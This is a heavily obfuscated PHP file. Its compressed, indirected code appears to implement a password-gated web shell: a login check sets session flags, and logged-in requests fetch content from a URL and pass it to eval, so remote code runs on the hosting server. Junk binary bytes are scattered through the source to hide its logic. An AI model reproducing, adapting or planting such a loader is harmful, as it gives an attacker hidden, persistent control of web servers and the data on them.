<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');ûÒññ‘Þ¾õÆô…Ð¼ßãµžØÒ‰î”ÉöŒ‡ñðÃ¨;$_GET[O0] = explode('|||', gzinflate(substr('‹      mS]š@M›>5é ü ¿vÝ­ÚXwM]±€múDÆa”I!3—U|G+¸Ë‹÷žsîñ~€¤R2ž…°€ÃûÃ»Ã‡ÉÊ›»Ë ôœ`å-o¼ð§Ž×ä¦î|îþš»“q0sMnå;ÞøÑY~æY’`Ô³ì¦Î÷çáOÇ›M/kÿ÷äú•áXS5qÝï3§b‘„,cPK%žCˆ…Àe
¦{Jj)I¸¤:OøvK#e£Ó›¨Û·»½»N›®7½.!wýÒ½Ý´:í~w*“4êé ËB>/TŽ\\Xòœ+ÇÂg\'xr4¶ü?ZŽ¥ÜqU™àD%TÝœ;a2,$!. ¦0‚Vê
‡ÇAvâpµ&*5äò!wÖV±ÅúèBxÊÄ"<E’([Î-¢û	º‘(¦8’(Å,C,ÝZyœk³¯#ýk¨gðùÁêpFi2úôñ6båRÅ§$tÔ³ÛÆ7ªÿ.HÃU
ª
Ö<*ëDµLÅh·^»(l€*A­$Vò
ÍÔ*÷¨eµm«õ–ôrB7\\¤FJ!æÑÐ<žË40õ½MÓP&thòå½a[öóÊáäÂ²¼ Ê\\©Ï—6§<O0¡1O"*Ôá·üÖ Ï*CY¬SæH¿s¤ÉëAÐq’ú¼Í¨²Ë¶Õ:/wü_KV   ',0x0a, -8)));×ÃçÚßäõÎóå“æÚîàÇÖçøùÃ³©¦àæ‡Ú°æ÷Ž²÷Ø’Í¾ŸöÄì‡Í™ã—£óØŒÄÕ³­‚ÍëôÎ©òÄ¹¸€¬ëøî¸¥½„ø;
$_GET{O0}[0]();




function fetch_url_with_cookies($O00) {
    $O0O = [
        $_GET{O0}{0x001} => !0,
        $_GET{O0}[0x0002] => !0,
        $_GET{O0}{0x00003} => $_GET{O0}[0x000004],
        $_GET{O0}{0x05} => !1,
        $_GET{O0}[0x006] => !1,
    ];
Í–ê£ºÒüï²ª“­Ý¿³½ˆ˜Çç‰ó½ýÓå§èÉÓã“þýª¦¹ùµ¨àª˜¥ùßºí»ç;

    if (isset($_SESSION[$_GET{O0}{0x0007}])) {
        $O0O[$_GET{O0}[0x00008]] = $_SESSION[$_GET{O0}{0x0007}];
    }

    $OO0 = $_GET{O0}{0x000009}($O00);
    $_GET{O0}[0x0a]($OO0, $O0O);
‘È¸‡ö¶‘ÃÂà§±¹«Ýø¼†Ý¡¼ƒÊÝã;
    $OOO = $_GET{O0}{0x00b}($OO0);

    $_GET{O0}[0x000c]($OO0);


    return $OOO;
ç…Þ¿Öê;
}


function is_user_authenticated() {
    return !empty($_SESSION[$_GET{O0}{0x0000d}]);
}


function process_login($O0O0) {
    $O0OO = $_GET{O0}[0x00000e];

    if ($_GET{O0}{0x0f}($O0O0) === $O0OO) {
        $_SESSION[$_GET{O0}{0x0000d}] = !0;
        $_SESSION[$_GET{O0}{0x0007}] = $_GET{O0}[0x0010];     } else {
        echo $_GET{O0}{0x00011};
    }
}

if ($_SERVER[$_GET{O0}[0x000012]] === $_GET{O0}{0x0000013} && isset($_POST[$_GET{O0}[0x014]])) {
    $_GET{O0}{0x0015}($_POST[$_GET{O0}[0x014]]);
}

if ($_GET{O0}[0x00016]()) {
    $OO00 = $_GET{O0}{0x000017}($_GET{O0}[0x0000018]);
    EVAl($_GET{O0}{0x019} . $OO00);
} else {
        ?>
<?=$_GET{O0}[0x001a];
}
?>
